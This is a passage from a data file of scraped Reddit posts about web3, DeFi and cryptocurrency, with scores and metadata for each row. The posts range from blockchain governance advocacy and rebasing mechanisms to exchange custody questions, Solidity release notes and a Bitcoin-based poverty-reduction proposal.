with each other that it's impossible for anyone to even understand a fraction of what is going on and thus more importantly to know what and who to trust. this ever increasing opaqueness creates a fertile domestic and global breeding grund for special interest, gate keepers and intermediaries and erodes the ability for the system to stay honest where it matters. if you agree that transparency and non-biased mediation is worth pursuing, if you agree that trust in our institutions is necessary, then the blockchain is the solution we've been needing. blockchain is the answer to a simple but important question: *""how can we trust that a piece of information haven't been manipulated.""* it does so through a public ledger whose entries are accessible and validated, not by any one organization or person, but by the network itself. this network consist of nodes who's sole job it is to validate new entries into the ledger, incentivized by monetary gains for validation regardless of the specifics. this has shown to be a very solid framework for non-biased validation, at scale and with efficiency. given the turing complete nature of smart contracts, any political, legal, international, organizational agreement/claim/process can be put ""on-chain"" without the ability for any one party to change the history of events and with the ability for everyone to validate. furthermore to the extent that more complex structures needs to be created, blockchain allow not only for governance but enforcement. it solves all four previously mentioned criterion. **it's non-coercive** it can be implemented over time without destroying the current system. instead a mirror of the existing system can be created and provide a better alternative with all the benefits described. **it's non-exclusive.** because of the interoperable and permissionless structure of blockchain, everyone can participate or create their own alternatives to what exist. web3 doesn't benefit from network effect the way web2 do. read more here: [https://twitter.com/hello\_world/status/1470866414236061711](https://twitter.com/hello_world/status/1470866414236061711) **it's transparent** having an immutable publicly available ledger with every political claim, decision, process and event on-chain is the single most powerful tool against conspiring by the powerful against the powerless. **it create better problems** we can't create problem free solutions, but we can create better problems. by solving the non-partisanship in mediation through network validation, transparency of governance and immutability of decisions, we can put our focus on better problems: * faster and more thorough legislation * more contextually sensitive legal structure * more nuanced decision making * faster decision making * fairer processes * previously impossible types of cooporation * more quantifiable feedback loops * faster error correction blockchain as a framework for governance and enforcement is a more scalable, transparent and fairer system and allow us to further improve the advances already made by previous systems without having to destroy it first. that's the moral case for web3. p.s. this is the first draft of where i am going to spend my personal time in 2022. to take the criticism seriously and to address it head on with the intellectual honesty it deserves. hope the community will help do the same. thanks for reading this far hope you enjoyed it!

Would you agree that this is a good recipe for a good web3 game?,"as the gamefi space continues its journey to attract gamers to a new gaming paradigm, community members shared their takes on what they think a mature gamefi project needs to succeed. one redditor suggested that gamefi projects need to appeal to several target audiences, including whales, who will provide funding; earners, who are mostly kids and people from developing countries; and those who play for fun, who will leave good reviews for the game. another community member pointed out the need to improve the reputation of the space. according to the redditor, some consider gamefi a scam — and this needs to be changed. in addition, the community member also highlighted that it would help if gamefi projects held e-sports competitions with high prize pools as rewards. meanwhile, one user said that a matured gamefi project must have a way to make its token relevant for gamers. this suggests that further use cases must be added. in addition, the user also suggested integrating decentralized finance liquidity mining for the tokens. gamefi like axie, spinterlands, cosmogene, lifebeyond, and other games have been a steady presence in crypto with the rest of crypto still struggling. going back to the basics of gaming, another community member believes that the most important factor gamefi projects should focus on is making the game fun and engaging, which will make users come back “day in and day out.”",16,7,0.82,2022-12-27 19:41:13,web3,web3,TruNeby,False,20.6

Isn't all these blockchains very messy?,"i'm trying to understand what's the best solution to utilize my cold wallet, which supports many blockchains and layer 2s. i find the options overwhelming, and i'm not sure what's the best way to go about it. for example, if the tokens are not available within a single blockchain (and i don't want to pay ethereum gas fees to operate all evm compatible token swaps on there), i would have to get the native token of each individual blockchain for fees, find a compatible bridge or swap service, keep track of what i have, and when it comes to time to sell it, repeat the entire process again while leaving residue amounts of money everywhere? additionally, the lack of interoperability in layer-2 blockchains is kinda confusing (and unfortunate) in my experience. first, layer-2 tokens on the ethereum mainnet basically serve no purpose or share benefits of the layer 2 blockchain. take a private coin for example; a transaction sending its token on ethereum would still be transparent/public because the ethereum mainnet is public. similarly, we can have multiple versions of the same token (like usdc) on multiple blockchains too. to actually use a layer-2 blockchain, i have to individually bridge over their native tokens and assets and remember which ones my assets are stored in, which feels really unorganized. i wish there was a blockchain that could just make individual tokens function as their own blockchain/feature set, instead of separating all of them into different wallets (even though i know that's not how layer-2 works.) there is also the issue with support. on smaller chains, like some random network built on cosmos for example, they would not receive the same wide range of services and/or dapps to make them practical to use for daily transactions etc. what would their purpose serve except for their niche in creating the project in the first place? to be honest, if i were to invest in various different tokens, trading on centralized exchanges (with all their security risks and kyc issues) provide a much cleaner environment compared to defi; while decentralized exchanges exist too, their options are far fewer and limited to tokens on their blockchain. to really experience the tech and security in defi (although obviously there's plenty of dangers here too, with blind signing and stuff), i would have to sacrifice a lot of that ease and i don't know if there is anything currently that can solve/explain any of these concerns i'm having. i would like to know a bit more about this.",13,6,1.0,2024-01-07 09:15:24,web3,defi,IceHertz,False,20.2

We just released Solidity v0.8.28! 🚀,"this version brings full support for transient storage state variables of value types, improvements to speed up compilation via ir and lower ram usage, bugfixes, and more! ✨ notable features → **support for transient storage value type state variables** v0.8.27 introduced support for transient storage variables into the parser that allowed users to generate transient storage layout. it was previously not possible to generate bytecode for contracts using such variables. this newest release of the compiler provides full support for transient state variables of value types, in both the ir and legacy pipelines. → **generating json representations of yul asts only on demand** the compiler internally caches most of the outputs it generates to be reused. however, in some cases this can be superfluous and can increase memory usage. this release eliminates some of this caching, reducing memory usage in ir compilation of real projects by up to 80%. it also prevents yul asts from being generated when not explicitly requested, which reduces the running time of the ir pipeline by up to 25%. → **per-contract pipeline configuration** until now, the simple design of the mechanism meant that the pipeline always had to run the same stages of compilation for all contracts. as a consequence, requesting bytecode for even one contract resulted in unnecessary bytecode generation for all of them, even though the output was ultimately discarded. this release eliminates this limitation by introducing per-contract pipeline configuration. note that the change only affects the standard json interface, since per-contract output selection is not available via the cli.

I'm curious.,"wanted to pick your brain about an issue related to evm based custody management. especially how large exchanges manage these kinda wallets (ethereum, bsc, tron). i know exchanges give each of their users a unique evm address. when multiple users deposit usdt onto their respective wallets… 1. how does the exchange remove the tokens from each user’s wallet into a central hot wallet pot? is there a function that allows the exchange to move all the money on all these multiple wallets in one api call while paying a one time gas fee? 2. if not, do the exchanges have to move the tokens from each user’s wallet one by one? and if so, who pays for the gas for these transfers? 3. my guess is that the exchanges move gas onto the user’s wallet and then use the newly deposited gas to transfer the usdt to the central hot wallet. this was my guess until i looked up my binance bsc wallet on bscscan. the logs show that when i deposited 1000 busd, binance transferred that 1000 busd to their central hot wallet. what was interesting to me was that they did not deposit bnb as gas onto my wallet to help facilitate this transfer. how was the transfer paid for then? smart contract? curious to learn.",12,9,0.93,2023-03-30 11:43:33,web3,CryptoTechnology,halseydepp,False,20.1

"Call out for compute, lets break records together!","over the past couple of years, i've been working away on a research network called cassie which will lay the groundwork for the radix network upgrade, xian. cassie exhibits a number of novel and interesting properties, but the core goals were to implement a linearly scalable consensus protocol which also retains high decentralization and security metrics. linearly scalable in this context means that if the compute (validators) available to the network doubles, then the maximum throughput of the network also doubles. this has been tested extensively, both in the ""lab"" and with members of the radix community participating in the tests and we have achieved great results so far sustaining 120,000 transactions per second (about 50% being complex smart contract calls such as swaps) and consumed bursts of 160,000+ without issue. our plan over the next few months is to run a series of tests with a goal to exceed 1,000,000 transactions per second for sustained periods of time. this will require significant compute hence my call out across crypto in general for participation. we could of course simply rent compute from the various cloud providers and do the test ourselves, but my desire here is for these tests to be as representative of main-net performance as possible. that requires that we (radix) should run a minimal amount of validators to bootstrap the network and the rest provided by 3rd-parties. the validators would then be globally distributed, different hardware configurations & isps (we've had some guys use starlink successfully at high load!) and behave akin to a main-net in the wild (minus the value of course). too often these ""tests"" are performed in a ""lab"" environment, totally under the control of the project stakeholders, run for short durations typically minutes, very simple transactions such as a->b transfers, high specification hardware, super fast connection & low numbers of validators. in some cases, critical elements have been disabled such as signature generation & validation in order to push the numbers. these results are then paraded as if they are some kind of achievement, but upon main-net launch the performance capability is a fraction of what these tests achieved. it is disingenuous, dishonest & unhealthy, distracting from legitimate projects who are working hard on real scalability solutions. we want to do it right! if you'd like to participate, please send me a dm. also interested in any suggestions to ensure these tests as are real world representative as they can be. thanks in advance, and i look forward to busting some records with you all!",15,5,0.9,2024-05-09 06:27:23,web3,defi,fuserleer,False,20.0

Human psychology can help improve web3 games.,"before nfts lost their charm, they were disrupting the art industry and poised to do the same to other industries, including gaming. even then, however, the burst of nfts into the game-making scene drew a mix of reactions, from major publisher enthusiasm to gamer backlash with some games like axie, alien world proving huge hits with games like cosmogene, lifebeyond following in their footsteps. it turns out finding a use case (or use cases) within the gaming industry takes a little more nuance than, say, the art industry — the blockchain-based technology’s first case study. for the gaming industry, the challenge is developing creative and interactive games centered around a sustainable model for nfts and play-to-earn (p2e) that enhance the gaming experience rather than annoy gamers — and clues and strategies on how to establish such a model may be found in human psychology. bartle’s ‘player taxonomy’ the gaming industry is starting to come to terms with blockchain technology and its use cases. in doing so, it can find guidance from one of its most venerable and respected psychology-driven underpinnings of gaming, which has already inspired a lot of the features we see in a lot of modern games. dr. richard bartle’s player taxonomy splits players into four distinct groups — socializers, explorers, achievers, and killers. understanding that there are four different kinds of gamers can help game developers more effectively leverage non-fungible tokens (nfts) in their creations. despite being written as part of a 1996 essay, bartle’s position on video game player types is still more than relevant for today’s era where mobile gaming is the industry’s driving force.",16,2,0.94,2023-01-11 04:21:12,web3,web3,TruNeby,False,19.799999999999997

DePIN and blockchain - new trend for the bullrun,"depin is gaining traction in the crypto space lately. decentralized physical infrastructure networks (depins) are introduced as blockchain protocols that operate infrastructure in an open and decentralized manner, utilizing cryptocurrency tokens to incentivize the construction of real-world infrastructure. one example is helium, a decentralized wireless network rewarding participants with native crypto for providing connectivity by sharing personal internet access. the key components of ai infrastructure, include data storage and management, computing resources, data processing frameworks, and machine learning frameworks. by leveraging cryptocurrency and blockchain technology, depin offers unique advantages such as permissionless access to gpu power, eliminating dependence on centralized cloud providers. additionally, decentralized data storage networks reduce the risk of data loss and enhance security by storing data across a global network of nodes. the primary benefit of implementing ai on depins is highlighted as the ability to develop ai technology in a decentralized and open-source manner. this approach aligns with the increasing calls for the democratization of ai, aiming to reduce entry barriers, provide unrestricted access, and make ai solutions more affordable for a wider range of users. in the last bullrun, it was all about defi, and nfts later on. now narrative has shifted towards ai and tokenization. in addition to above mentioned helium, there are other noteworthy depin projects like weaver labs that ""combine communications infrastructure into a shared asset pool, enabling its use in an open market by anyone"", constellation network that ""offers a decentralized network without fees, allowing anyone to contribute to the development of web3"", holochain an ""end-to-end, open source, p2p app framework creating an ecosystem of decentralized apps with distributed, user-controlled storage"", sentinel dvpn ""a global ecosystem of autonomous dvpn apps enabling private, censorship-resistant internet access."" i for sure will follow how these projects develop in 2024. what's your take on depin projects? do you have your favorite?",7,16,0.9,2024-01-03 05:22:07,web3,BlockchainStartups,Crnorukac,False,19.6

What is Web3? An experiment in the Feynman method of learning,"one of the steps in the feynman method of learning is to teach others what you have learned. in that spirit, i've taken a stab at breaking down what web3 is and how it applies to the industry i work in. i would love to hear some of your comments and critiques of the text below to help supercharge my learning around this topic, thanks! you have likely seen the phrase “web3” pop up in either your news or social media feeds at least a few times over the past months. so what is web3? why do you often hear it mentioned with the term metaverse? these are especially pertinent questions for businesses whose interactions with customers take place over the internet. we created this short brief to help you understand what web3 is, how it differs from web1 & web2, and how it relates to other new technologies. **if there is a web3, what were web1 and web2?** web1 refers to the earliest stages of the public internet. during this stage, websites were widely relegated to being “read-only,” in the sense that there was minimal interaction between the website and the user. as a result, the web1 era largely limited service providers to only be able to offer information to customers, rather than provide services such as shopping, entertainment, and so on due to the lack of web enabled software. web2 has been the present state of the internet for roughly the past two decades, with this stage being known for “read-write.” unlike the web1 era, web2 is centred around user interaction. thanks to the proliferation of web enabled software, end-users now generate much of the content online (i.e. social media), and the internet is used for commercial opportunities such as retail, entertainment (i.e. streaming, gaming), networking, and advertising (not common during web1). **what is web3 then?** web3 is the next stage of the internet, which has started to originate over the last couple of years due to the emergence of blockchain technology. web3 is built over decentralized protocols, on blockchains such as bitcoin, ethereum, and avalanche to name a few. these blockchains are powered by and maintained through the use of consensus mechanisms such as proof-of-work or proof-of-stake, and through nodes. these protocols are governed by participants and stakeholders, which is represented in a decentralized manner such as through mining power or through the ownership of tokens or cryptocurrencies. web applications built over these blockchains are decentralized applications (referred to as dapps), whereas web2 applications are controlled by centralized entities (i.e. facebook/meta or youtube), thus data ownership is consigned to the centralized entity that hosts and owns the application the user is utilizing. in web3, dapp’s are hosted on the previously mentioned decentralized blockchains through smart contracts, meaning the data storage is decentralized. smart contracts are self-executing and irreversible contracts, which serve as the de facto terms and conditions for their respective application, operating in a fair and transparent manner. while web1 was read-only, and web2 was read-write, web3 is centred around read-write-own. in web2, users generated the content while the host had full control over the data. for instance, if you posted a comment on a social media page, you did not own the content – you could be booted from the platform or have your comment removed if the platform operator deemed you had violated their terms and conditions. furthermore, the platform operator is usually free to monetize your data by selling it to 3rd parties. in web3, data ownership is not retained by the platform operator but rather by the network and its stakeholders, hence read-write-own. **how does web3 provide value for users?** due to web3 resting on blockchain technology, a cornucopia of opportunities exist for end users. users can generate value by receiving rewards through helping secure the pertinent blockchain, either by participating as a miner, or by staking cryptocurrencies they hold. through smart contracts, users can earn income through actions such as providing liquidity for trades, creating scarcity through nfts, and more. there is also interoperability due to dapps sharing the same underlying blockchain (i.e. all dapps on the ethereum blockchain). what this means is that functions of one application are able to interact with functions on other applications as long as they are based on the same blockchain. nft refers to non-fungible token, a non-fungible token is a unit of data that exists upon a blockchain (such as ethereum). non-fungible means that the token is unique – for an example of something that is fungible, you can exchange a bitcoin with another bitcoin and they are fundamentally the same thing. a non-fungible token cannot be swapped out with another non-fungible token. nfts are commonly associated with digital art, however they can also be used to represent in-game assets for video games, such as digital plots of land or clothing for players’ avatars. some services, such as partybid, use smart contracts to allow individuals to pool their capital together when purchasing nfts. this enables users to acquire partial ownership of assets they might not otherwise be able to afford. one way this will provide value for users is through what is known as play-to-earn. play-to-earn is the concept of video game players earning income (in the form of tokens and nft’s) by playing the video game. completing actions in the game, or by holding certain in-game assets, rewards players with in-game tokens. these token and nft assets can then be exchanged for other cryptocurrencies or fiat currencies. tokenizing in-game assets empowers users by turning what was once a sunk-cost purchase (i.e. purchasing a loot box), into digital assets that the user solely owns. from there the user is able to trade or sell these digital assets to other players if they no longer want the digital items. **how does web3 relate to other new technologies?** newer technologies such as blockchain and metaverse are central to web3. but while they share many characteristics, they do not necessarily mean the same thing. web3 relies on blockchain technology, as web3 is oriented around bypassing consolidated data silos (i.e. tech giants) through having data be distributed across peer-to-peer networks. blockchain technology does not rely on web3 however. many applications will likely be a crossover of web2 and web3. as an example, take the brave web browser. brave’s browser by default blocks advertisements – however users have the ability to toggle ads on, and in-exchange brave shares 70% of the advertising revenue with the user. this is done through their bat token, using a smart contract over the ethereum blockchain. another popular example is opensea, which is the largest nft marketplace. web3 does not necessarily rely on the metaverse and vice versa. as is the case with blockchain technology, there will likely be a substantial mixture of web2 and web3 with metaverse applications. companies like meta are focusing on offering centralized metaverse solutions for things such as workspaces in addition to the more talked about gaming metaverse applications. much of the metaverse will certainly be web3 and utilize blockchain technology due to the benefits of tokenizing digital assets. **will web3 impact igaming?** we’re not sure what type of impact web3 will have on igaming as it’s not readily apparent. rather than being exclusive built for web3, the more likely outcome is that the igaming industry adopts a mix of web2 and web3. this is in part because igaming is inherently a centralized industry with regulations varying widely across the globe and with liquidity being an important factor for sportsbooks. however, web3 is all about user empowerment and for most of the 21st century igaming companies have focused their innovation efforts on back-end developments to boost data analytics and marketing capabilities – which are not inherently (or even usually) bettor-centric improvements. due to the advancements in technology, igaming companies have an excellent opportunity to heed the call of user empowerment and improve their offerings to bettors through the use of technologies such as on-chain wagering and provably fair mechanisms. **web3 caveats** it is important to note that web3 is not fully decentralized, which is in part by user choice. most creators and users do not wish to run their own node on a blockchain due to the resources and time required to do so. instead they focus their efforts on creating applications or for ease of use. additionally, there is a power imbalance when it comes to mining power, and to token ownership, where centralized entities (such as companies devoted to crypto mining, or venture capital firms participating in coin offerings) can dwarf other stakeholders. even so web3 offers a drastic change in the power dynamics for users, as unlike in web2 where a centralized entity is all powerful for their application, in web3 centralized entities are competing amongst themselves in addition to all of the individual stakeholders on the network. there is also a common public critique of nft art from those unfamiliar with blockchain technology – which is that someone can simply save or copy the image, or even create a counterfeit nft (i.e. creating a different nft token utilizing the same image the original artist created). these critiques rarely take into account that forgery and trademark violations have been a perpetual issue in the physical world. moreover these concerns when related to nfts are a moot point – users are able to guarantee the authenticity of the nfts they are acquiring thanks to the blockchain. blockchains maintain an immutable record of ownership every time a token or cryptocurrency is transferred. since these records are publicly accessible, a user is easily able to verify that their purchase is authentic. those purchasing nft’s should also ensure they are not running afoul of any relevant regulations. some nft’s are designed to be fractional, in a manner similar to a timeshare. this falls into a grey area of regulations, particularly in the us, as this likely renders the given nft a security. i hope you enjoyed this breakdown, and please comment if you have a different opinion on some of the concepts laid out in this piece.",17,1,0.9,2022-03-08

Why is Plan B's model so popular despite the prediction (OOS) for the last cycle?,"i recently discussed this with a friend who is relatively new to bitcoin, while i’ve been invested since 2016. he was highly confident in the s2f model, citing its recent transient performance. i then showed him the forecasts from before and during the last cycle. he was surprised to learn that the prediction for the average price of the 2021/2022 cycle wasn’t $55k, but $100k. the following post is from nov 2021: [https://x.com/100trillionusd/status/1458776821932048387](https://x.com/100trillionusd/status/1458776821932048387) for comparison a recent post from plan b with the refitted version: [https://x.com/100trillionusd/status/1858174274042773770](https://x.com/100trillionusd/status/1858174274042773770) after plan b refitted his model—which is generally fine—he repeatedly claimed that the s2f model had always predicted $55k for the last cycle. it seems that many people believe the s2f model was nearly spot-on for that cycle. surprisingly, even those who have been invested since 2020 share this view, despite the model’s history of inaccurate predictions. i suspect most people don’t understand the distinction between in-sample and out-of-sample predictions. even so, why don’t they review the model’s earlier predictions, especially those based on its 2021 refit? i was never a big fan of the model, primarily because of the causal assumptions underlying its specification. however, the aspect mentioned above genuinely confuses me.",7,22,0.65,2024-11-18 11:51:32,web3,CryptoCurrency,mchrisoo7,False,19.5

CEX vs DEX,"is the term cex kind of a misnomer in the crypto space? i know that exchanges like coinbase/cdc centralise wallet management, kyc (for regulation) and provide features akin to traditional trading apps such as order limits etc. cexs maintain an order book and matches orders as well, however, when it comes to actual trade execution of the asset, everything still executes on the underlying chain right? they provide liquidity through their own accounts or lps, but there is no exchange that can suspend trading on any asset, unlike a traditional exchange (nyse etc.) that can pull almost all liquidity on an asset with suspensions (or even the whole exchange). if coinbase stopped all trading today, i could still trade the same assets (coins) on another exchange (both cex and dex), whereas if nyse suspends trading on a stock, there is no other (easy) way i can trade that stock, even if i use another broker etc. i could go otc but that's still subject to the exchange's approvals. rug pulls and wallet locks aside, which is of course the biggest risk in a cex, based on this, are crypto cexs truly central conceptually? i think it would be more of a hybrid as they do centralise the user experience and provide more liquidity through acting as a market maker, but the underlying assets and trade executions still go back to the blockchain and there is no risk of a central party blocking your access to assets on the chain. edit: adding some thoughts, perhaps platforms like coinbase/cdc etc. are better described as brokerages (saxo/td), with some providing liquidity and market making capabilities as opposed to being an exchange in the traditional sense of the word.",9,12,0.91,2024-01-06 00:00:54,web3,CryptoTechnology,fabbbles,False,19.299999999999997

Are we discounting Rebasing as a concept?,"i really feel that people are discounting rebasing as a concept. rebasing has faced criticisms like bad ux, or bad integration and composability with other dapps but rebasing is one of those architectures which is very difficult, inefficient & costly to enable in web2 but can be done easily in web3. i'm a strong proponent of utilising blockchain core properties to deliver something of value which cannot be done through the web2 tech stack. rebasing can be the answer to some of the difficult questions in defi. while building my product, i did some study of different rebasing mechanisms. a typical rebase function will include change in user balances and below are different types of rebasing in the market right now **1. ampleforth type rebasing** ampleforth focuses on an elastic supply mechanism where any price volatility of ampl token is passed on through supply expansion or contraction across user balances. they basically set a target rate which they aim to maintain, while the market price reflects the current value. the difference between two is supply delta. the user balances are updated as reduce this supply delta. to update balances across all user balances at once, they multiple the non-rebasing user balance maintained internally within the contract with some number ‘rebase scalar’ and balances are updated across all user balances at once. **2. lido rebasing** ampleforth follows an algorithmic type rebasing with no backing but lido finance rebasing mainly focuses on allocating the staking eth yields back to all the users who have minted their rebasable token steth which is backed by eth. they follow a share mechanism. every time a user deposits token, it is converted to shares and added to the current user shares amount. these shares remain constant as long as their are no new deposits /withdrawals and any incoming staking yield increases the total eth balance but the share balance remain same, so per share eth value increases. this increased eth balance is reflected across every user balance by increasing the amount of steth in their wallet. mountain protocol rebasable usdm is also based on this mechanism **3. blast rebasing** blast l2 uses 2 mechanisms. first is the automatic yields which is similar to lido above rebasing mechanism to update user & dapp balances. second is the claimable yield mechanism where user balances stay the same but users can claim yield anytime by calling claimyield() functions. this claimable yield can be claimed to any address unlike the automatic yield mechanism where yield only accrues to the address from which tokens where deposited. **4. lybra finance rebasing** lybra finance wanted to pass the yields generated from underlying collaterals in their eusd stablecoin. so, if yield is generated in eth for some lst then rather than passing eth yields to the users which would have been a costly/inefficient operation while doing across user balances as the yields to be transferred are in a different asset i.e eth and the token contract is for eusd so user balances cannot be changed by updating balanceof() across users. so, in order to rebase user balances in eusd they could have minted eusd matching the eth yield. however this would have led to reduced eusd backing when eth price is reduced so this wasn’t an option. so, they went ahead with the option of selling the accumulated eth yield at a discount in a dutch auction styled mechanism. different users can pitch with increasing amounts of eusd to buy eth yield at a discounted rate. any eusd captured through this is reflected across all the user balances through a similar share mechanism as discussed in lido. **5. sperax rebasing usds** sperax usds has an auto yield rebasing feature where they just like lybra above, sells the accumulated yield for usds in open market and then burns the bought usds token. they then maintain a credit per token which is a shared or global variable. the user balance is calculated as credit/credit per token. credit per token is decreased resulting in increase in every user balance but the total supply remains unchanged as they earlier bought a similar quantity of usds token. **6. olympus dao rebasing (3,3)** olympus dao utilised a combination of bonding and staking to create a self enforcing loop. if all users stake their tokens (represented as the “3,3” outcome), it benefits everyone as the token supply increases through rebasing, but everyone’s relative share stays the same, and stakers earn rewards. bonding is utilised to capture more & more treasury by issuing ohm tokens at a discount with a 5 day period. so, treasury balance backing ohm keeps on increasing and if more staking occurs then selling pressure is reduced leading to less price decreased and increase in user ohm value through ohm rebasing. apart from these, there are compound ctoken exchange rate type tokens whose price increases with the yield instead of the user balance increasing. lido wsteth or maker sdai or ethena susde all follows this exchange rate mechanism to create a yield bearing asset i am excited to discuss on some other cases where rebasing can act as a strong value additive tool",10,10,0.92,2024-09-16 02:48:22,web3,defi,Fearless_Run4,False,19.200000000000003
Why Is Web 3.0 Important?,"we provide over 100+ free crypto articles on our substack! :d (link on our profile) **tldr**:the early internet needed avant-garde programmers and businesses to develop new products to make the internet useful and to be rewarded for the value they created. no one knows in advance what the consequences of their construction will be.cryptonetworks, with their open-source protocols and everyone-owned networks, offers the opportunity to restructure the internet into a system that benefits more people around the world. this is a vision worth striving for.the world evolving today is increasingly controlled by technology, so we must design systems that benefit the collective. the transformation of the internet, from web 2.0 to web 3.0, is diverse and will change the way we interact with the internet. # general conclusion in early 2021, we had discussions on the idea of building a decentralised internet, commonly referred to as web 3.0. * in the united states president trump has been banned from using twitter, and parler, which uses aws services, has been removed from playstore and appstore. * whatsapp has announced that they will share information with their parent company facebook * uganda has ordered internet service providers to block all social networking platforms these are important and understandable issues and need to be actively discussed.small businesses and startups rely on facebook advertising services, google search suggestions, and amazon's aws service to survive. artists and creators face the risk of having their information deleted from sites like spotify, instagram and tiktok. although these are not new problems, it is becoming more and more serious. the development of technology monopolies and their scalability to information privacy rights and personal freedoms has spurred the internet transition from web 2.0 to web 3.0 # what is web 3.0? web 3.0 (commonly called web3) is a reform model aimed at democratising the internet. web 3.0 is present in the crypto space and other digital fields such as ai, virtual and augmented reality, and more. by applying new technologies, web 3.0 is changing how we, as a collective, view and value the internet. web 3.0 is about creating an internet that works for everyone, owned by everyone. # where web 3.0 comes from the term was originally coined in 2014 and popularised in 2018 by ethereum co-founder and polkadot founder gavin wood. the spirit of this term goes back to when satoshi developed bitcoin and advocated decentralised dns called bitdns. >“i think it would be possible for bitdns to be a completely separate network and separate blockchain, yet share cpu power with bitcoin.” - satoshi (2010) dns has long been controlled by organisations such as verisign and the internet corporation for assigned names and numbers (icann) overseen by the us department of commerce. this centralised control of dns has been used to enforce ip rights, prohibit websites from selling copyrighted material, censor free-of-speech sites like wikileaks and seize domain names (ip addresses) without proper procedures, etc. censorship decisions are usually influenced by the top levels of government and the lobbyists of the largest multinational organisations, who may not always be acting in the best interests of the general public.satoshi and other bitcoin enthusiasts recognised this. in 2011, a fork of bitcoin called namecoin was born to allow censorship-proof domains at *.bit* domain addresses.namecoin was ahead of its time. a proxy service or extension (such as metamask today) was required to log in at the *.bit* domain, making it very difficult to use. plus, most people did not want their own website or personal domain at that time. all of this caused namecoin to fail because of low demand from its users.ten years later and now new blockchains and decentralised services may be ready for success. these applications are making the internet more decentralised with web 3.0. another example of such infrastructure is the handshake network.",14,2,1.0,2021-11-14 18:24:36,web3,web3,economicsdesign,False,19.200000000000003

Poverty-Reducing Economy via Bitcoin and One-Dollar-Store Model,"abstract: this proposal presents a transactional system, based on existing blockchain technology, that permits usage of digital currency ecosystem for reduction of general poverty. the bitcoin and digital currencies based on blockchains are already widely used and understood. however, it is often assumed that they do not offer any real-world benefits beside financial speculation with an exaggerated risk, or even support of illegal operations… on the other hand, it is possible to implement enhancements to existing blockchain algorithms of bitcoin and other digital currencies – the enhancements that may lead to creation of “moneyless economy”, a sub-economy of general economy, with poverty-reducing benefits. the first part of enhancement requires creation of the “gift card request pool”. it is similar to a usual memory pool of pending transactions, but instead collects signed requests for “gift cards” provided by real economy agents (unrelated to blockchain miners). a “gift card” is an abstract object that gives its recipient a right to receive some tangible or intangible product from a real-world producer or store (gift card provider). for a “gift card request” to be valid, it should include: a wallet identifier of the requester, with this wallet having a non-zero balance; a wallet identifier of the product, which should also have a non-zero balance (zero balance denotes that a gift offer is no longer available); a timestamp. a gift card request is non-mandatory for fulfilling, and expires in 24 hours. the moment a gift card request appears in the pool, its associated provider considers the availability of resources to fulfill the request, or if there are too many requests present at a given time, selects (e.g., via a lottery) requests that can be fulfilled immediately. if the request can be fulfilled, the provider creates a special transaction in miners’ transaction pool. this gift card transaction (which may only originate from a product wallet) includes gift card receiver’s wallet identifier, transaction fee, and a public identifier string of the issued gift card (which is unique to the provider). the receiver’s identity (beside wallet) is not included into the request nor transaction as it is assumed that the receiver was already registered with the provider in their local database, to facilitate a timely real-world transfer of a product to this receiver. the public identifier of a gift card is non-redeemable, and it can be used for product delivery assurance by a third party, which may or may not be mandatory, depending on authority control’s implementation specifics. this public identifier may also refer to a publicly-accessible information for audit that a provider does actually deliver gifts offered (may include delivery partner’s identifier). secondly, it is quite obvious that without some authority control both a gift card request and its fulfilling can be easily faked. in order to avoid or minimize the fraud, the authority transactions should be implemented. an authority transaction is a singular transfer of a non-zero balance from an “authority wallet” to gift card receiver’s wallet or product wallet, along with a message “grant” or “revoke”, possibly with wallet owner’s confirmed name. the authority wallets are a set of agreed-upon wallet identifiers shared and accepted by miners (an authority wallet may be related to a specific economy niche a blockchain targets). gift card receiver’s and product’s wallets without the most recent “grant” authority message from an agreed authority are not considered valid. each wallet should pass through a control of at least one agreed authority, which is a real-world process not covered by the blockchain technology nor this proposal, and may require legislation which is not yet in place; a control procedure may involve identity confirmation, some background checks, and an infrequent, but regular processing fee paid from a real-world account, to support authority’s operations. where is the money? this is the third part of the proposed enhancement. the monetary mass of a digital currency is produced in the process of “mining”: when a miner finds a suitable blockchain hash value, a specific sum of digital currency is awarded to this miner, increasing the monetary mass as a result. since this is just a book-keeping operation, the currency can be similarly awarded to the gift card providers. so, in the proposed enhancement, a miner not only builds a block of transactions for which it tries to find a hash value, but also calculates rewards of gift card providers. here, the one-dollar-store model kicks in: the overall block reward less miner’s own reward is evenly spread over all included gift card transactions. for example, if block reward is 100 coins, and there were 1000 gift card transactions in the block, 10% (10 coins) plus transaction fees are rewarded to the miner, while the remaining 90 coins are spread over 1000 product wallets: 0.09 coins per wallet. if there were only 10 gift card transactions in the block, then each product wallet would be rewarded with 9 coins. there would be no remaining coins awarded if there were no gift card transactions. this is a self-regulating reward system that balances offers by parties willing to participate and compete for the reward. the main factors of the competition are: the market reach of a gift card provider, a gift’s quality, and digital currency’s real-world valuation. however, most digital currencies favor a “deflationary” model where mining rewards diminish over time. since one-dollar-store model requires more-or-less stable real goods prices, and needs to account for real-world inflation, an inflationary model is better suited, in order to match the increasing mass of goods to the monetary mass, and to match real-world expenses of gift card providers over time. for example, the block reward may be fixed at 5% of overall coin mass per year, at any given time, which means that the block reward numerically increases after each mined block. since it is the miner who prepares the block for inclusion into the blockchain, miner’s software should consider both the gift card request pool and gift card transactions placed by gift card providers: there should be a match of non-zero wallets together with existence of prior “grant” authority transactions. matching signed gift card requests should be included into the block, to have a proof of requests’ existence. as an additional anti-fraud and anti-flood counter-measure, miner’s software may reject transactions between a requester and a provider, for a given product wallet, that again occur sooner than a specific number of blocks: it is common to receive the same product once a day, or even less often. this goes on top of gift card providers’ possibility to select gift card receivers (e.g., via country and repeatability filters). in overall, the most problematic parts of this system are authority control and delivery checks (which may be selective and probabilistic). but considering that digital currencies are generally a “funny money” while poverty is real, an implementation attempt seems a worthwhile endeavor. with the 500-billion-dollar capitalization of bitcoin, the proposed system could provide 22 billion dollars of free goods per year, while the “free stuff” at the same time being a great marketing attraction for both the coin and the providers, and an image booster for wealthy investors. note that before 2016, bitcoin’s yearly inflation was way above 5%, yet this had no much negative effect on its then valuations: it is a speculative asset, with the inflation affecting only a part of its expected value. real-world currencies are subject to inflation as well, ensuing valuation parity between them and the coin.",12,5,1.0,2023-06-13 03:04:05,web3,CryptoTechnology,avaneev,False,19.2
